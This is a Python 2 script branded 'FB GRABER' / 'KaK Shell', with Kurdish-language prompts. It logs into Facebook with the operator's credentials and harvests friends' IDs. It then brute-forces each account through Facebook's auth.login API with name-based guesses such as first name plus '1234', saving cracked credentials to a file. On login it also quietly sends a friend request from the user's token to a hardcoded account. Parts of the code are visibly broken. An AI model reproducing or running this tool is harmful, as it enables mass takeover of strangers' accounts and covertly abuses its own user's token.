#!/ufr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
print("FB GRABER")
os.system('clear')




reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36')]


def kelwa():
	print "\x1b[1;96m🚶‍  \x1b[1;91 Chwna dara wa"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def anime(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(000.1)


#### LOGO ####
logo = """

\x1b[31;1m _______  _______  _______  _______  _______  \x1b[37;1m  _______  __   __  _______  ___      ___     
\x1b[31;1m|       ||       ||   _   ||       ||       | \x1b[37;1m |       ||  | |  ||       ||   |    |   |    
\x1b[31;1m|  _____||_     _||  |_|  ||    ___||    ___| \x1b[37;1m |  _____||  |_|  ||    ___||   |    |   |    
\x1b[31;1m| |_____   |   |  |       ||   |___ |   |___  \x1b[37;1m | |_____ |       ||   |___ |   |    |   |    
\x1b[31;1m|_____  |  |   |  |       ||    ___||    ___| \x1b[37;1m |_____  ||       ||    ___||   |___ |   |___ 
\x1b[31;1m _____| |  |   |  |   _   ||   |    |   |     \x1b[37;1m  _____| ||   _   ||   |___ |       ||       |
\x1b[31;1m|_______|  |___|  |__| |__||___|    |___|     \x1b[37;1m |_______||__| |__||_______||_______||_______|
                                                        

"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mtkaya bosta \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\x1b[37;1m+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×++×+×+×+×+
\x1b[31;1m@            Staff  Shell                @
\x1b[37;1m+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×++×+×+×+×+
"""                                
hr = """
\x1b[31;1m   _____ __        ________ \x1b[37;1m  _____ __         ____
\x1b[31;1m  / ___// /_____ _/ __/ __/ \x1b[37;1m / ___// /_  ___  / / /
\x1b[31;1m  \__ \/ __/ __ `/ /_/ /_   \x1b[37;1m \__ \/ __ \/ _ \/ / / 
\x1b[31;1m ___/ / /_/ /_/ / __/ __/ \x1b[37;1m  ___/ / / / /  __/ / /  
\x1b[31;1m/____/\__/\__,_/_/ /_/    \x1b[37;1m /____/_/ /_/\___/_/_/   
  
version >> 1.0
staff >> Shell                                  
"""
print(hr)
CorrectUsername = "kakshell"
CorrectPassword = "kakshell"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\x1b[34;1m👨‍ \x1b[1;95mID \x1b[31;1m>>\x1b[1;91m")
    if (username == CorrectUsername):
    	password = raw_input("\x1b[34;1m🤖 \x1b[1;95mID Paswword \x1b[37;1m>>>\x1b[1;91m")
        if (password == CorrectPassword):
            print "daxl bwet ba ID " + username #Baha J HeX
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96m password kat halaya"
            
    else:
        print "\033[1;96mID kat halaya "
        

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('tkaya facebook k daxl ka ')
		print('\x1b[31;1m<-------------$\x1b[36;1mLOGIN\x1b[31;1m$------------->')
		id = raw_input('\x1b[35;1m[🆔️]¤EMAIL/ID¤♤> \x1b[37;1m')
		pwd = raw_input('\x1b[35;1m[⛔]¤PASSWORD¤♡> \x1b[31;1m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[31;1m INTERNET CONNECTION LOST"
			kelwa()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[32;1m[✓]Login bw basar kawtwe'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[31;1m[!]There is no connection[!]"
				kelwa()
		if 'checkpoint' in url:
			print("\n\x1b[31;1m[!] bbwra am account la checkpoint ya bakar nayat[!]")
			os.system('rm -rf login.txt')
			time.sleep(1)
			kelwa()
		else:
			print("\n\x1b[31;1m[¿]Email w Password t halaya[¿]")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[[31;1m[♤] bbwra Token ka halaya [♤]"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		namefb = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		subid = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91m account kat la checkpoint ya"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		kelwa()
	os.system("clear")
	print logo
	#INFORMATION OF USER
	print "~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\x1b[32;1mFacebook/ Name >>"+namefb
	print "\x1b[34;1mFacebook/ ID >>"+id
	print '\x1b[33;1mFacebook/ TotalSub >>'+subid
	print "~~~~~~~~~~~~~~~~~~~~~~~~"
	print ""
	print "===================="
	print "\x1b[37;1m[1]> dast pekrdn ba hack"
	print "\x1b[37;1m[2]> bo update krdna wa"
	print "\x1b[37;1m[0]> darchwn"
	print "===================="
	#INFORMATION OF USER
	option()

def option():
	unikers = raw_input("\n\x1b[31;1mKaK@\x1b[37;1mSheLl>>\x1b[33;1m")
	if unikers =="":
		print "\x1b[31;1m[!]tkaya boshaya ka ba batale je mahela"
		option()
	elif unikers =="1":
		graber()
	elif unikers =="2":
		os.system('clear')
		print logo
		anime("<<<<<<<<PREPARE TO ♡●♡UPDATE TOOL >>>>>>")
		os.system('bash update.sh')
	elif unikers =="0":
		anime('LOGIN OUT ACCOUNT PLEASE WAIT')
		os.system('rm -rf login.txt')
		kelwa()
	else:
		print "\x1b[31;1m tkaya shte xayr awana manwsa"
		option()

def graber():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[31;1mToken k halaya tka ya daxl bara wa"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\x1b[31;1m{1}~~Hack krdn la regay friend wa "
	print "\x1b[31;1m{2}~~Hack krdn la regay ID public kawa "
	print "\x1b[31;1m{0}~~chwna darawa"
	startgrab()

def startgrab():
	peak = raw_input("\x1b[37;1mKaK@\x1b[31;1mSheLl>> ")
	if peak=="":
		print "\x1b[1;91mtkaya bosha yaka ba batale je mahela"
		startgrab()
	elif peak =="1":
		os.system('clear')
		print logo
		print "@@@@@@@@@@@#KaK×Shell#@@@@@@@@@@@"
		anime('\033[1;91mwar grtne ID kan \033[1;91m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("[♤]ID kasaka bnwsa>>>")
		print "@@@@@@@@@@@#KaK+SheLl#@@@@@@@@@@@"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"Facebook/ Name :  "+op["name"]
		except KeyError:
			print"\x1b[31;1mBbwra ID ka na dozra yawa"
			raw_input("[GARANAWA]enter bka")
			graber()
		print"\x1b[32;1mWargrtne ID...."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mtkaya bosha ya ka ba jwane pr kara wa"
		startgrab()
	
	print "\x1b[32;1m[♡]koe ID kan>>"+str(len(id))
	anime('tkaya bosta.................................')
	titik = ['.   ','..  ','... ','....','.....']
	for o in titik:
		print("\r\x1b[37;1m[☆]Cracking"+o),;sys.stdout.flush();time.sleep(1)
	print "\n                            \x1b[37;1m <●>°•°<●>KaK ×+× SheLl<●>°•°<●>"
	print "   \x1b[31;1m#############################################################"

	anime('          \x1b[34;1m  dastpe krdn  tkaya bosta..... ')
	print  "  \033[1;92m#############################################################" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('Graber')
		except OSError:
			pass #KaKSheLl
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[37;1m Hack kraw'											
				print '\x1b[37;1mNAWE >>> '+ b['name']											
				print '\x1b[37;1mID kay >>>' + user											
				print '\x1b[37;1mPASSWORD kay >>>' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[37;1maccount ka la Checkpoint ya'
				    print '\x1b[37;1m NAWE >>> ' + b ['name']
				    print '\x1b[37;1mID kay>>> ' + user
				    print '\x1b[37;1mPASSWORD kay>>> ' + pass1 + '\n'
				    cek = open("Graber/Id_pass.txt", "a")
				    cek.write("ID:" +user+ " Password:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[37;1m Hack kraw'											
				            print '\x1b[37;1mNAWE >>> '+ b['name']											
				            print '\x1b[37;1mID kay >>>' + user											
				            print '\x1b[37;1mPASSWORD kay >>>' + pass2 + '\n'													
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[37;1maccount ka la Checkpoint ya'
				               print '\x1b[37;1m NAWE >>> ' + b ['name']
				               print '\x1b[37;1mID kay>>> ' + user
				               print '\x1b[37;1mPASSWORD kay>>> ' + pass2  + '\n'
				               cek = open("Graber/id_pass.txt", "a")
				               cek.write("ID:" +user+ " Pass:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'1234'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[37;1m Hack kraw'											
				                       print '\x1b[37;1mNAWE >>> '+ b['name']											
				                       print '\x1b[37;1mID kay >>>' + user											
				                       print '\x1b[37;1mPASSWORD kay >>>' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[37;1maccount ka la Checkpoint ya'
				                           print '\x1b[37;1m NAWE >>> ' + b ['name']
				                           print '\x1b[37;1mID kay>>> ' + user
				                           print '\x1b[37;1mPASSWORD kay>>> ' + pass3 + '\n'
				                           cek = open("Graber/id_pass.txt", "a")
				                           cek.write("ID:" +user+ " Pass:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + '12345@@'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[37;1m Hack kraw'											
				                                   print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                   print '\x1b[37;1mID kay >>>' + user											
				                                   print '\x1b[37;1mPASSWORD kay >>>' + pass4  + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[37;1maccount ka la Checkpoint ya'
				                                       print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                       print '\x1b[37;1mID kay>>> ' + user
				                                       print '\x1b[37;1mPASSWORD kay>>> ' + pass4 + '\n'
				                                       cek = open("Graber/id_pass.txt", "a")
				                                       cek.write("ID:" +user+ " Pass:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = b['first_name'] + '12345aa'						
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[37;1m Hack kraw'											
				                                               print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                               print '\x1b[37;1mID kay >>>' + user											
				                                               print '\x1b[37;1mPASSWORD kay >>>' + pass5  + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[37;1maccount ka la Checkpoint ya'
				                                                   print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                   print '\x1b[37;1mID kay>>> ' + user
				                                                   print '\x1b[37;1mPASSWORD kay>>> ' + pass5 + '\n'
				                                                   cek = open("Graber/id_pass.txt", "a")
				                                                   cek.write("ID:" +user+ " Pass:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = '1122334455'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[37;1m Hack kraw'											
				                                                           print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                           print '\x1b[37;1mID kay >>>' + user											
				                                                           print '\x1b[37;1mPASSWORD kay >>>' + pass6  + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[37;1maccount ka la Checkpoint ya'
				                                                               print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                               print '\x1b[37;1mID kay>>> ' + user
				                                                               print '\x1b[37;1mPASSWORD kay>>> ' + pass6  + '\n'
				                                                               cek = open("Graber/id_pass.txt", "a")
				                                                               cek.write("ID:" +user+ " Pass:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[37;1m Hack kraw'											
				                                                                       print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                                       print '\x1b[37;1mID kay >>>' + user											
				                                                                       print '\x1b[37;1mPASSWORD kay >>>' + pass7  + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[37;1maccount ka la Checkpoint ya'
				                                                                           print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                                           print '\x1b[37;1mID kay>>> ' + user
				                                                                           print '\x1b[37;1mPASSWORD kay>>> ' + pass7  + '\n'
				                                                                           cek = open("Graber/id_pass.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '12345678'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[37;1m Hack kraw'											
				                                                                                   print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                                                   print '\x1b[37;1mID kay >>>' + user											
				                                                                                   print '\x1b[37;1mPASSWORD kay >>>' + pass8  + '\n'			
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[37;1maccount ka la Checkpoint ya'
				                                                                                       print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                                                       print '\x1b[37;1mID kay>>> ' + user
				                                                                                       print '\x1b[37;1mPASSWORD kay>>> ' + pass8  + '\n'
				                                                                                       cek = open("Graber/id_pass.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '12345678'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[37;1m Hack kraw'											
				                                                                                               print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                                                               print '\x1b[37;1mID kay >>>' + user											
				                                                                                               print '\x1b[37;1mPASSWORD kay >>>' + pass9  + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[37;1maccount ka la Checkpoint ya'
				                                                                                                   print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                                                                   print '\x1b[37;1mID kay>>> ' + user
				                                                                                                   print '\x1b[37;1mPASSWORD kay>>> ' + pass9  + '\n'
				                                                                                                   cek = open("Graber/id_pass.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
        anime(">>>>>>>>>$\x1b[31;1mKaK\x1b[37;1mSheLl\x1b[0m$<<<<<<<<<<")
	anime("\x1b[37;1mRecode by Baha" )#KaK SheLl
	print '\x1b[32;1m Crack krdna ka kotay hat [√]^_^ '
	print"\x1b[31;1mKoy HITS/\x1b[31;1mCHECKPOINT\x1b[37;1m: \x1b[32;1m"+str(len(oks))+"\x1b[31;1m/\x1b[33;1m"+str(len(cekpoint))
	print ""
	print(logo)
	anime(">>>>>>>>>>>>>>>Member<<<<<<<<<<<<<<<")
	anime(">> KaK SheLl")
	anime(">>>>>>>>>>>>>>>Member<<<<<<<<<<<<<<<")
	print ""
	print ""
	raw_input("\n\x1b[31;1m [DWBARA KRDNA WA] enter bka")
	menu()

if __name__ == '__main__':
	login()
